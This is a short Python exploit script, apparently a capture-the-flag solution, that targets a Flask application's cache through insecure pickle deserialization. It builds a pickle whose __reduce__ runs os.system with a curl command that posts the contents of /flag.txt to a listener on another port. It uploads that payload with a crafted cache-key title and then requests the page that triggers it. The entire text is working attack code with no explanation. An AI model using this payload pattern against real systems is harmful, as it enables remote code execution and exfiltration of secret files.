from requests import get, post
import pickle
import os
import io

class pwn(object):
    def __reduce__(self):
        return os.system, ('curl http://localhost:5001/ --data "$(cat /flag.txt)"',)

p = b'!' + pickle.dumps(pwn())
print(len(p))
print(p)
#pickle.loads(pickle.dumps(pwn()))
post(
    'http://localhost:5000/',
    files={"content": io.BytesIO(p)},
    data={"title": "flask_cache_viewflask_cache_view////test1"}
)

get("http://localhost:5000/test1")
